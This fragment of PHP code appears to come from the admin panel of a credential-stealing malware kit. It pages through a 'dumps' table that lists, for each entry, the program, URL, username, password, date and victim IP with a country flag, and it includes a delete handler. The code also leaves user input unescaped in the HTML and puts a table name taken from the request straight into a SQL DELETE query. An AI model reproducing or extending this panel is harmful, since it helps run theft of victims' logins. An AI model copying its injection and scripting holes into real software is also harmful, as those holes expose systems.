                    			<tr><td colspan='8'>Page ". $_GET["page"] ." of ".ceil($logstotal/(int)$_SESSION["rpp"])." from about ".$logstotal." Results.    <img src='images/page_copy.png'/>";
				for ($i = ($_GET["page"]-3); $i < $_GET["page"]; $i++) {
                            		if (($i > 0) && ($i <= ceil($logstotal/(int)$_SESSION["rpp"]))){$html .= "<a href='?admin=dumps&page=".$i."' id='page'> ".$i.", </a>";}
				}
				$html .= "<b>". $_GET["page"] ."</b>, ";
				for ($i = ($_GET["page"]+1); $i < ($_GET["page"]+4); $i++) {
					if (($i > 0) && ($i <= ceil($logstotal/(int)$_SESSION["rpp"]))){$html .= "<a href='?admin=dumps&page=".$i."' id='page'> ".$i.", </a>";}
				}
				$html .= "</tr></tfoot><tbody>";
				$result = mysql_query("SELECT * FROM `dumps` LIMIT ".(($_GET["page"]-1)*(int)$_SESSION["rpp"])." , ".(int)$_SESSION["rpp"].";", $mysql);
				if (!$result) die(mysql_error());
				$i = 0;
				while ($row = mysql_fetch_array($result)) {
					$Arr = GetCountryNameById(GetGountryIdByIp($row["ip"]));
                    			$html .= "<tr>";
                        		$html .= "<td>".$row["id"]."</td>";
                        		$html .= "<td>".$row["program"]."</td>";
                        		$html .= "<td>".$row["url"]."</td>";
					$html .= "<td>".$row["login"]."</td>";
                        		$html .= "<td>".$row["pass"]."</td>";
                        		$html .= "<td>".$row["date"]."</td>";
					$html .= "<td><img src='showflag.php?ip=". $row["ip"] ."'/>".$row["ip"]."</td>";
                        		$html .= "<td><a href='?admin=delete&table=dumps&sel=".$row["id"]."'><img src='images/bin_empty.png'/></a></td>";
                    			$html .= "</tr>";
					$i++;
				}
			
			}
		} else {
			$html .="<table id='gradient-style' summary='Dumps'><thead><tr>
                        	<th scope='col'><img src='images/vcard.png'/>ID</th>
                        	<th scope='col'><img src='images/page_white_office.png'/>Program</th>
                        	<th scope='col'><img src='images/transmit.png'/>Url</th>
                        	<th scope='col'><img src='images/user_gray.png'/>Username</th>
                        	<th scope='col'><img src='images/shield.png'/>Password</th>
                        	<th scope='col'><img src='images/date.png'/>Date</th>
				<th scope='col'>Ip</th>
                    	</tr></thead><tfoot><tr><td colspan='7'>There are NO dumps to display</td></tr>";
		}
		$html .= "</tbody></table>";
	}
//-------------------------------------------------------------------------------------------
	if ($_GET["admin"] == "delete") {
		$sTable = $_GET["table"];
		if (isset($_GET["sel"])) {
			$mysql = connect_database();
				if (is_numeric($_GET["sel"])) {
					$result = mysql_query("DELETE FROM `".$sTable."` WHERE `id` = ".$_GET["sel"]." LIMIT 1;", $mysql);
					if (!$result) die(mysql_error());
				}
			mysql_close($mysql);
		}
		
		header("Location: ?admin=".$sTable."&page=1");
	}
//-------------------------------------------------------------------------------------------
	$html .="</div></body></html>";
	echo $html;
}
?>